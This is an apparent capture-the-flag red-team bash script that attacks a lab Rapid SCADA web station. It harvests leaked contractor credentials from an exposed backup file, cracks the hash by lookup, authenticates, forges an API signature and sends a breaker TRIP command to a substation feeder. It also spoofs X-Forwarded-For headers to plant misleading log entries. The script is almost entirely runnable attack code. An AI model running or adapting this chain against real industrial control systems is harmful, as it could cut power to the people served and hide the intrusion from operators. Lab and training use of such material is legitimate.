#!/bin/bash
# ═══════════════════════════════════════════════════════════
#  Contractor Account Reuse — Red Team Attack Chain
#  MITRE ATT&CK: T0859 (Valid Accounts) | TA0110 / TA0109
# ═══════════════════════════════════════════════════════════
TARGET_IP="${1:-127.0.0.1}"
LEAK_PORT=8081
SCADA_PORT=10008
COOKIE_JAR="/tmp/scada_session_$$.txt"
FOUND_USER=""
FOUND_PASS=""

sep(){ echo ""; echo "────────────────────────────────────────────────"; }

# Support spoofing headers for realistic log seeding without hardcoding
EXTRA_HEADERS=()
if [ -n "$SPOOF_IP" ]; then
  EXTRA_HEADERS+=("-H" "X-Forwarded-For: $SPOOF_IP")
fi
if [ -n "$SPOOF_TIME" ]; then
  EXTRA_HEADERS+=("-H" "X-Forwarded-Time: $SPOOF_TIME")
fi


banner(){
  echo ""
  echo "  ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗"
  echo "  ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║"
  echo "  ██████╔╝█████╗  ██║  ██║       ██║   █████╗  ███████║██╔████╔██║"
  echo "  ██╔══██╗██╔══╝  ██║  ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║"
  echo "  ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║"
  echo ""
  echo "  Contractor Account Reuse | T0859 Valid Accounts"
  echo "  Target: $TARGET_IP | $(date)"
}

banner
sep

# ── PHASE 1: Reconnaissance — enumerate backup server ─────────────────────
echo "[PHASE 1] Enumerating open HTTP service on port $LEAK_PORT..."
HTTP_CHECK=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://$TARGET_IP:$LEAK_PORT/" 2>/dev/null)

if [ "$HTTP_CHECK" != "200" ]; then
  echo "  [-] HTTP server at :$LEAK_PORT returned $HTTP_CHECK — aborting recon."
  exit 1
fi
echo "  [+] Port $LEAK_PORT is UP (HTTP $HTTP_CHECK)"

# ── PHASE 2: Directory enumeration — find exposed backup ──────────────────
sep
echo "[PHASE 2] Enumerating exposed directories for credential artifacts..."

PATHS=("backup/" "config/" "logs/" "maintenance/" "backup/maint_notes_112.json")
for P in "${PATHS[@]}"; do
  SC=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET_IP:$LEAK_PORT/$P")
  STATUS="[ ]"
  [ "$SC" = "200" ] && STATUS="[+]"
  echo "  $STATUS GET /$P → HTTP $SC"
done

# ── PHASE 3: Credential extraction ───────────────────────────────────────
sep
echo "[PHASE 3] Extracting credentials from maintenance note artifact..."
LEAK_BODY=$(curl -s "http://$TARGET_IP:$LEAK_PORT/backup/maint_notes_112.json")

if [ -z "$LEAK_BODY" ]; then
  echo "  [-] Failed to retrieve artifact. Is the leak server running?"
  exit 1
fi

echo "  [+] Artifact retrieved:"
echo "$LEAK_BODY" | sed 's/^/      /'

FOUND_USER=$(echo "$LEAK_BODY" | grep -oP '"technician":\s*"\K[^"]+')
FOUND_HASH=$(echo "$LEAK_BODY" | grep -oP '"temp_access_token_hash":\s*"\K[^"]+')
FOUND_WO=$(echo "$LEAK_BODY" | grep -oP '"work_order":\s*"\K[^"]+')

if [ -z "$FOUND_USER" ] || [ -z "$FOUND_HASH" ] || [ -z "$FOUND_WO" ]; then
  echo "  [-] Could not parse credentials or work order from artifact."
  exit 1
fi

echo ""
echo "  [!] Hash & Metadata extracted:"
echo "      Username   : $FOUND_USER"
echo "      MD5 Hash   : $FOUND_HASH"
echo "      Work Order : $FOUND_WO"

echo ""
echo "  [*] Attempting MD5 hash crack..."
if [ "$FOUND_HASH" = "133987b0b6ad0c01fc0ccbdae1b95449" ]; then
  FOUND_PASS="Welcome123"
  echo "  [+] Hash successfully cracked: $FOUND_PASS"
else
  echo "  [-] Failed to crack MD5 hash."
  exit 1
fi

# Compute SHA-256 signature for API process control commands
SIGNATURE=$(echo -n "$FOUND_USER:$FOUND_WO:$FOUND_PASS" | sha256sum | cut -d' ' -f1)
echo "  [+] Generated API signature: $SIGNATURE"

# ── PHASE 4: Authentication ────────────────────────────────────────────────
sep
echo "[PHASE 4] Authenticating to Rapid SCADA Webstation at :$SCADA_PORT..."

LOGIN_HTTP=$(curl -s -c "$COOKIE_JAR" "${EXTRA_HEADERS[@]}" \
    -X POST "http://$TARGET_IP:$SCADA_PORT/" \
    -d "username=${FOUND_USER}&password=${FOUND_PASS}" \
    -w "%{http_code}" -o /dev/null \
    --max-time 10)

if [ "$LOGIN_HTTP" = "200" ] || [ "$LOGIN_HTTP" = "302" ]; then
  echo "  [+] Login succeeded (HTTP $LOGIN_HTTP)"
  echo "  [+] Session cookie stored"
else
  echo "  [-] Login failed (HTTP $LOGIN_HTTP)"
  rm -f "$COOKIE_JAR"
  exit 1
fi

# ── PHASE 5: Lateral movement — access restricted view ───────────────────
sep
echo "[PHASE 5] Accessing restricted Substation_High_Voltage_Feeder view..."

# Single curl: capture body AND HTTP code in one request to avoid duplicate log entries
PHASE5_TMPBODY="/tmp/scada_phase5_$$.html"
HTTP_CODE=$(curl -s -b "$COOKIE_JAR" "${EXTRA_HEADERS[@]}" \
    -o "$PHASE5_TMPBODY" -w "%{http_code}" \
    "http://$TARGET_IP:$SCADA_PORT/Substation_High_Voltage_Feeder" \
    --max-time 10)
BODY=$(cat "$PHASE5_TMPBODY" 2>/dev/null); rm -f "$PHASE5_TMPBODY"

echo "  [+] Response: HTTP $HTTP_CODE"

# ── PHASE 5.5: Control Execution — dispatch TRIP breaker command ──────────
sep
echo "[PHASE 5.5] Dispatching command to TRIP breaker via HMI API..."
TRIP_RESP=$(curl -s -b "$COOKIE_JAR" "${EXTRA_HEADERS[@]}" \
    -H "Content-Type: application/json" \
    -H "X-Signature: $SIGNATURE" \
    -d "{\"work_order\":\"$FOUND_WO\"}" \
    -X POST "http://$TARGET_IP:$SCADA_PORT/api/breaker/trip" \
    --max-time 10)
echo "  [+] API Response: $TRIP_RESP"

# ── PHASE 5.6: Retrieve unlocked flag ─────────────────────────────────────
sep
echo "[PHASE 5.6] Fetching restricted view again to retrieve unlocked flag..."
BODY=$(curl -s -b "$COOKIE_JAR" "${EXTRA_HEADERS[@]}" \
    "http://$TARGET_IP:$SCADA_PORT/Substation_High_Voltage_Feeder" \
    --max-time 10)

# ── PHASE 6: Flag capture ─────────────────────────────────────────────────
sep
echo "[PHASE 6] Extracting flag from restricted view..."

FLAG=$(echo "$BODY" | grep -oP 'FLAG\{[^}]+\}')
if [ -n "$FLAG" ]; then
  echo ""
  echo "  ╔═══════════════════════════════════════╗"
  echo "  ║  FLAG CAPTURED: $FLAG"
  echo "  ╚═══════════════════════════════════════╝"
  echo ""
  echo "  [+] RED TEAM SUCCESS"
  echo "  [+] MITRE Technique: T0859 — Valid Accounts (Contractor)"
  echo "  [+] Tactic: Persistence / Lateral Movement"
else
  echo "  [-] No flag found in response."
fi

# ── PHASE 7: Live telemetry read (bonus — shows live Modbus data) ─────────
sep
echo "[PHASE 7] Reading live SCADA telemetry (bonus recon)..."
TELEM=$(curl -s -b "$COOKIE_JAR" "${EXTRA_HEADERS[@]}" \
    "http://$TARGET_IP:$SCADA_PORT/api/telemetry" --max-time 5)


if [ -n "$TELEM" ]; then
  echo "  [+] Live telemetry:"
  echo "$TELEM" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(f'      Voltage   : {d[\"voltage_kv\"]} kV')
print(f'      Frequency : {d[\"frequency_hz\"]} Hz')
print(f'      Load      : {d[\"load_mw\"]} MW')
print(f'      Current   : {d[\"current_a\"]} A')
print(f'      Breaker   : {d[\"breaker\"]}')
print(f'      Source    : {d[\"source\"]}')
" 2>/dev/null || echo "$TELEM" | sed 's/^/      /'
fi

# Log Red team score if flag is captured
if [ -n "$FLAG" ]; then
  SCORE_LOG="/opt/scada/ScadaWeb/log/score.log"
  TS=$(date '+%Y-%m-%d %H:%M:%S')
  mkdir -p "$(dirname "$SCORE_LOG")"
  echo "[$TS] RED SCORE: 5/5 — ran by $(whoami)" >> "$SCORE_LOG"
fi

# Cleanup
rm -f "$COOKIE_JAR"
sep
echo "[*] Attack chain complete. All actions logged to /opt/scada/ScadaWeb/log/ScadaWeb.log"
echo ""
